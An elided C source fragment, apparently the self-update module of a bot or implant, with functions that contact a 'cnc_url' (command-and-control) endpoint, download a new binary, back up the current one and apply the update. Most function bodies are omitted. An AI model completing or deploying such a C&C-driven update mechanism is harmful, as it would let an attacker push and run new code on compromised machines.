...
static size_t download_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    FILE *fp = (FILE *)userp;
...
update_context_t *update_init(const char *cnc_url, const char *public_key_path) {
    ...
    if (len > 0) {
        ...
        snprintf(ctx->backup_path, sizeof(ctx->backup_path), 
                "%s%s", ctx->current_binary_path, BACKUP_SUFFIX);
    }
...
bool update_check_available(update_context_t *ctx,
    ...
    if (ctx == NULL || metadata == NULL) return false;
    
    ctx->status = UPDATE_STATUS_CHECKING;
    
    // Build update check URL
    char url[1024];
    snprintf(url, sizeof(url), "%s/api/update/check?version=%s",
            ctx->cnc_url, current_version);
...
int update_download(update_context_t *ctx,
    ...
    if (ctx == NULL || metadata == NULL || output_path == NULL) return -1;
    ...
    log_info("Download complete: %s (%lu bytes)", output_path, metadata->binary_size);
...
int update_apply(update_context_t *ctx,
    ...
    if (ctx == NULL || binary_path == NULL) return -1;
...
int update_auto_check_and_apply(update_context_t *ctx,
                               const char *current_version,
                               bool auto_apply) {
    if (ctx == NULL || current_version == NULL) return -1;
